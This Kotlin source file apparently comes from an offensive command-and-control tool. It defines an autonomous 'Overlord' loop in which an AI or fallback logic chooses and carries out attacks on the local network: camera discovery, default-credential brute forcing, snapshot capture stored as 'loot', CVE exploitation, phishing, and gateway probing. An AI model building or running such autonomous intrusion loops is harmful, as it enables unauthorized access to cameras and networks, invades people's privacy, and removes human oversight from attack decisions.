package com.projectzerodays.quantumcli.ops

import com.projectzerodays.quantumcli.c2.C2State
import com.projectzerodays.quantumcli.c2.CameraHit
import com.projectzerodays.quantumcli.c2.Grayfish
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * AutonomousOverlord parity — camera-first background decision cycle running
 * on the device. AI-driven JSON decisions when an AI brain is alive, QBrain
 * deterministic fallback; the act whitelist is always obeyed.
 */
object Overlord {

    val ACTIONS = listOf(
        "cam_war", "cam_discover", "cam_control", "recon_scope", "exploit",
        "brute", "phish", "worm", "harvest", "router", "osint",
        "episcribe", "mitre_report", "rest"
    )
    val CAMERA_ONLY_ACTS = listOf(
        "cam_war", "cam_discover", "cam_control", "mitre_report", "rest"
    )

    @Volatile
    private var job: Job? = null

    private val _running = kotlinx.coroutines.flow.MutableStateFlow(false)
    val running: kotlinx.coroutines.flow.StateFlow<Boolean> = _running

    @Volatile
    var cameraOnly: Boolean = false

    fun stateJson(): JSONObject {
        val cams = JSONArray()
        C2State.cameras.value.forEach { c ->
            cams.put(
                JSONObject()
                    .put("ip", c.ip)
                    .put("vendor", c.vendor)
                    .put("controlled", c.creds != null)
            )
        }
        val targets = JSONArray()
        C2State.cameras.value.forEach { targets.put(it.ip) }
        return JSONObject()
            .put("cams", cams)
            .put("targets", targets)
            .put("fired", JSONArray())
            .put("implants", C2State.implants.value.size)
            .put("killswitch", C2State.killswitch.value)
    }

    /**
     * @param aiDecide optional AI hook returning a strict-JSON decision
     *                 {action, target, reason}; null/QBrain fallback on any
     *                 parse failure (decide.py parity).
     */
    fun start(
        scope: kotlinx.coroutines.CoroutineScope,
        cameraOnly: Boolean = false,
        intervalSec: Int = 45,
        aiDecide: (suspend () -> String?)? = null,
    ) {
        stop()
        this.cameraOnly = cameraOnly
        val acts = if (cameraOnly) CAMERA_ONLY_ACTS else ACTIONS
        _running.value = true
        C2State.audit("C2", "OVERLORD cycle started (interval ${intervalSec}s, camera_only=$cameraOnly)")
        job = scope.launch {
            while (isActive) {
                if (C2State.killswitch.value) {
                    C2State.audit("OPSEC", "OVERLORD resting: kill-switch armed")
                } else {
                    val d = decide(acts, aiDecide)
                    C2State.recordDecision(
                        d.optString("action"), d.optString("target"), d.optString("reason")
                    )
                    execute(d)
                }
                delay(intervalSec * 1000L)
            }
        }
    }

    fun stop() {
        job?.cancel()
        job = null
        if (_running.value) {
            C2State.audit("C2", "OVERLORD cycle stopped")
        }
        _running.value = false
    }

    private suspend fun decide(
        acts: List<String>,
        aiDecide: (suspend () -> String?)?,
    ): JSONObject {
        var d: JSONObject? = null
        if (aiDecide != null) {
            try {
                val raw = aiDecide() ?: return qbrainDecide(acts)
                val clean = raw.replace("```json", "").replace("```", "").trim()
                val m = Regex("\\{.*}", RegexOption.DOT_MATCHES_ALL).find(clean)
                if (m != null) {
                    val parsed = JSONObject(m.value)
                    if (acts.contains(parsed.optString("action"))) d = parsed
                }
            } catch (e: Exception) {
                C2State.audit("AI", "overlord _decide JSON fail (${e.message}); QBrain fallback")
            }
        }
        return d ?: qbrainDecide(acts)
    }

    private fun qbrainDecide(acts: List<String>): JSONObject {
        val d = QBrain.decide(stateJson(), acts)
        if (!acts.contains(d.optString("action"))) {
            return JSONObject().put("action", "rest").put("target", "")
                .put("reason", "fallback")
        }
        return d
    }

    private suspend fun execute(d: JSONObject) = withContext(Dispatchers.IO) {
        val act = d.optString("action")
        val target = d.optString("target")
        try {
            when (act) {
                "cam_discover", "cam_war" -> {
                    val cams = CamWar.discover(Net.localScope(), bruteCreds = act == "cam_war")
                    C2State.setCameras(cams)
                    C2State.audit("CAM", "overlord ${act}: ${cams.size} camera(s) on ${Net.localScope()}")
                }
                "cam_control" -> {
                    val cam = C2State.cameras.value.firstOrNull()
                    if (cam != null) {
                        val shot = CamWar.snapshot(cam.ip, cam.vendor, cam.creds)
                        if (shot != null) {
                            val dir = File(C2State.lootDir, cam.ip).apply { mkdirs() }
                            val f = File(dir, "camshot_${System.currentTimeMillis() / 1000}.jpg")
                            f.writeBytes(shot)
                            val sealed = Grayfish.seal(f)
                            C2State.recordLoot(cam.ip, sealed, "camshot", shot.size)
                            C2State.audit("CAM", "overlord cam_control: snapshot ${cam.ip} sealed -> ${sealed.name}")
                        } else {
                            C2State.audit("CAM", "overlord cam_control: no snapshot from ${cam.ip}")
                        }
                    } else {
                        C2State.audit("CAM", "overlord cam_control: no cams known yet")
                    }
                }
                "recon_scope" -> {
                    val hosts = Recon.scan(Net.localScope())
                    C2State.audit("RECON", "overlord recon_scope: ${hosts.size} live host(s) on ${Net.localScope()}")
                }
                "exploit" -> {
                    val tgt = target.ifBlank {
                        C2State.cameras.value.firstOrNull()?.ip ?: Net.localIp()
                    }
                    val recon = JSONObject().put("ports", JSONArray(CamWar.CAM_PORTS.filter {
                        Net.tcpProbe(tgt, it, 500)
                    }))
                    val cve = QBrain.planAttack(recon)
                    val res = Weapons.fire(cve, tgt, JSONObject())
                    C2State.audit("ATK", "overlord exploit: $tgt -> $cve (${res.optString("status")})")
                }
                "brute" -> {
                    val cam = C2State.cameras.value.firstOrNull { it.creds == null }
                    if (cam != null) {
                        val creds = CamWar.checkCreds(cam.ip, cam.vendor)
                        if (creds != null) {
                            C2State.setCameras(
                                C2State.cameras.value.map {
                                    if (it.ip == cam.ip) it.copy(creds = creds) else it
                                }
                            )
                            C2State.audit("CAM", "overlord brute: CRACKED ${cam.ip} ($creds)")
                        } else {
                            C2State.audit("CAM", "overlord brute: no default creds on ${cam.ip}")
                        }
                    } else {
                        C2State.audit("CAM", "overlord brute: no uncracked cams")
                    }
                }
                "phish" -> {
                    val email = target.ifBlank { "operator@lab.local" }
                    val staged = Phish.launch(email)
                    C2State.audit("ATK", "overlord phish staged -> ${staged.optString("email")}")
                }
                "worm" -> {
                    val n = C2State.implants.value.size
                    C2State.audit("ATK", "overlord worm: $n implant(s) enrolled; beacon fanout healthy")
                }
                "harvest" -> {
                    C2State.scanLoot()
                    C2State.audit("OK", "overlord harvest: ${C2State.loot.value.size} sealed loot item(s)")
                }
                "router" -> {
                    val gw = Net.localIp().substringBeforeLast(".") + ".1"
                    val open = listOf(80, 443, 23).filter { Net.tcpProbe(gw, it, 800) }
                    C2State.audit("RECON", "overlord router: gateway $gw open ports $open")
                }
                "osint" -> {
                    C2State.audit("RECON", "overlord osint: scope targets = ${C2State.cameras.value.size} cams")
                }
                "episcribe" -> {
                    val fn = episcribe()
                    C2State.audit("OK", "overlord episcribe: engagement report -> ${fn.name}")
                }
                "mitre_report" -> {
                    val cov = com.projectzerodays.quantumcli.c2.MitreMapper.coverage(C2State.audit.value)
                    C2State.audit("OK", "overlord mitre_report: coverage ${cov.size} techniques")
                }
                else -> C2State.audit("C2", "overlord rest: holding pattern")
            }
        } catch (e: Exception) {
            C2State.audit("ERR", "overlord $act failed: ${e.message}")
        }
    }

    private fun episcribe(): File {
        val ts = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
        val f = File(C2State.qcliDir, "episcribe_$ts.md")
        val sb = StringBuilder()
        sb.append("# QUANTUM-CLI Engagement Report\n\n")
        sb.append("generated: ").append(SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US).format(Date())).append("\n\n")
        sb.append("## Implants\n\n")
        C2State.implants.value.forEach { (h, i) ->
            sb.append("- ").append(h).append(" — last_seen ").append(i.lastSeen)
                .append(", beacons ").append(i.beacons).append('\n')
        }
        sb.append("\n## Cameras\n\n")
        C2State.cameras.value.forEach { c: CameraHit ->
            sb.append("- ").append(c.ip).append(" (").append(c.vendor).append(") via ")
                .append(c.source).append('\n')
        }
        sb.append("\n## MITRE Coverage\n\n")
        com.projectzerodays.quantumcli.c2.MitreMapper.coverage(C2State.audit.value).forEach {
            sb.append("- ").append(it).append('\n')
        }
        f.writeText(sb.toString())
        return f
    }
}
